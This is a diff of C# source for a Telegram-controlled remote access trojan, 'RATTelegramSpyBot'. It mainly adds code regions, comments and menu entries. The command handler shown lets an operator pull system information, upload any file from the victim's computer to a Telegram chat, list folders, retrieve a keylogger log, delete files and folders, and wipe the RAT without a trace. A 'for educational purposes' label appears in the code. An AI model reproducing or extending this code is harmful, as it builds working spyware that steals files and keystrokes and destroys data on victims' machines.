@@ -65,13 +65,17 @@ namespace RATTelegramSpyBot {
             Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
 
             switch (message.Text.Split(' ').First()) {
-                case "/Status": // Verifica Si la PC se encuentra en linea
+                case "/Status":         // Verifica si estamos en linea
+                    #region /Status
                     await Bot.SendTextMessageAsync(config.ID, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                     break;
-                case "/Show_Information":
+                    #endregion
+                case "/Show_Information":// Muestra información del sistema
+                    #region /Show_Information
                     await Bot.SendTextMessageAsync(config.ID, Tools.PC_Info());
                     break;
-                case "/Get_FilesAll":  // Menú Obtiene archivos
+                    #endregion
+                case "/Get_FilesAll":   // Menú Obtiene archivos
                     #region /Get_FilesAll
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
@@ -113,8 +117,8 @@ namespace RATTelegramSpyBot {
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
                     break;
                 #endregion
-                case "/Dir":
-
+                case "/Dir":            // Lista ruta especifica
+                    #region /Dir
                     if (Path.Length <= 4) {
                         SendBotMessage("Si usted desea listar una unidad, hagalo con el comando: \n/Dir_DirectoryDisk\n Ya que el comando /Dir es solo para lisar carpetas especificas y no unidades\n NOTA: Espero en las proximas actualizaciones parchar ese error. ");
                     } else {
@@ -122,7 +126,9 @@ namespace RATTelegramSpyBot {
                     }
                     Path = "";
                     break;
-                case "/Dir_FolderDisk":
+                #endregion
+                case "/Dir_FolderDisk": // Lista Ruta de discos especificos
+                    #region /Dir_FolderDisk
                     var Disk = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree C:\\"       ,callbackData: "DDC"),
@@ -160,18 +166,18 @@ namespace RATTelegramSpyBot {
                     await Bot.SendTextMessageAsync(config.ID, "<b>NOTA: Este proceso puede demorar varios minutos, al culminár habrá un mensaje de FINISH'</b>", ParseMode.Html);
                     await Bot.SendTextMessageAsync(config.ID, "<b>NOTA2 : Se Omitirán directorios Protegidos con permisos especiales o del sistema</b>", ParseMode.Html);
                     await Bot.SendTextMessageAsync(config.ID, "Show directory tree from disk", replyMarkup: Disk);        // Obtiene USER
-
-
                     break;
-                case "/Get_OnlyFile":
+                #endregion
+                case "/Get_OnlyFile":   // Obtiene un archivo en especifico
+                    #region /Get_OnlyFile
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
-                    } else {
-                        GetOnlyFileTelegram(Path);
-                    }
+                    } else {GetOnlyFileTelegram(Path);}
                     Path = "";
                     break;
-                case "/Delete_OnlyFile":
+                    #endregion
+                case "/Delete_OnlyFile":// Elimina un archivo
+                    #region /Delete_OnlyFile
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Delete_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Delete_OnlyFile D:\\Documentos\\Monografía.docx");
                     } else {
@@ -179,21 +185,22 @@ namespace RATTelegramSpyBot {
                     }
                     Path = "";
                     break;
-  
-                case "/Keylogger":
+                    #endregion
+                case "/Keylogger":      // Keylogger [En proceso]
+                    #region /Keylogger
                     GetOnlyFileTelegram(config.PATH_KEY);
                     break;
-
-                case "/Delete_Folder":
+                    #endregion
+                case "/Delete_Folder":  // Elimina carpeta espeficica
+                    #region /Delete_Folder
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
-
-                    } else {
-                        Delete(Path, true);
-                    }
+                    } else { Delete(Path, true);}
                     Path = "";
                     break;
-                case "/DestroyRAT":
+                    #endregion
+                case "/DestroyRAT":     // Destruye RAt sin dejar Rastro
+                    #region /DestroyRAT
                     var DestroyRATButtons = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(text: "|ACCEPT|"  ,callbackData: "DestroyRATTrue"),
@@ -203,8 +210,8 @@ namespace RATTelegramSpyBot {
                     SendBotMessage("This process will destroy the RAT of the Computer, this process is irreversible");
                     await Bot.SendTextMessageAsync(config.ID, "Continue ?", replyMarkup: DestroyRATButtons);        // Obtiene USER
                     break;
-
-                case "/About":
+                    #endregion
+                case "/About":          // Información del Creador
                     #region /About
                     string about =
                         "<b>Developed by:</b> <code>SebastianEPH</code>" +
@@ -237,27 +244,38 @@ namespace RATTelegramSpyBot {
                     await Bot.SendTextMessageAsync(config.ID, "\n\n<b>[Fines educativos]</b>", ParseMode.Html);
                     break;
                 #endregion
-
                 //Mensaje por default
                 default:
+                    #region Default
                     const string usage =
                   "\n/Status                   <Check if the PC is online>" +
                   "\n/Show_Information <get detailed system information>" +     // Muestra información del sistema
+                  // Obtiene archivos o carpetas 
                   "\n/Get_FilesAll          |Buttons| <Get Files from Computer>" +  //Sube archivos [Imagenes,Fotos, Videos y documentos]
                   "\n/Get_OnlyFile  <Path>   C:\\User\\Photos and videos\\foto34.jpg " +    //Sube solo un archivo especifico.
+                  // Comandos para listar archivos o carpetas 
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subcarpetas.
-                  "\n/Dir_FolderDisk     |Buttons| Only Folder Tree Drive" +  // Lista Arbol de solo carpetas de Unidades de almacemiento
+                  "\n/Dir_CurrentUserFiles     <List files of current user>" +  // Lista Archivos dentro de los usuarios actual 
+                  "\n/Dir_CurrentUserFolders   <List folders of current user>" +// Lista Carpetas dentro del usuario actual 
+                  "\n/Dir_UserFolders     <Show User Folders>" +                // Muestra carpetas de usuarios en la PC 
+                  "\n/Dir_UserFolder     |Buttons| Only Folder Tree Drive" +    // 
+                  "\n/Dir_FolderDisk     |Buttons| Only Folder Tree Drive" +    // Lista Arbol de solo carpetas de Unidades de almacemiento
+                  // 
                   "\n/Keylogger           <Get File log >" +                    // Obtiene el registro de teclas por mensaje
-                  "\n/Delete_OnlyFile <Path> " +                                 // Elimina un archivo
+                  // Eliminar archivos o carpetas
+                  "\n/Delete_OnlyFile <Path> " +                                // Elimina un archivo
                   "\n/Delete_Folder <Path> " +                                  // Eliminar Carpeta con todos los archivos dentro.
                   "\n/DestroyRAT  |Button| <Accept> or <Denied>" +              // Destruye el RAT del Sistema sin Dejar Rastro
+                  // Others
                   "\n/Help                    <This menu>" +
                   "\n\r" +
+                  // Datos de creador
                   "\n/About         <This Information>" +
                   "";
                     await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n", ParseMode.Html);
                     await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
                     break;
+                    #endregion
             }
         }
         private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
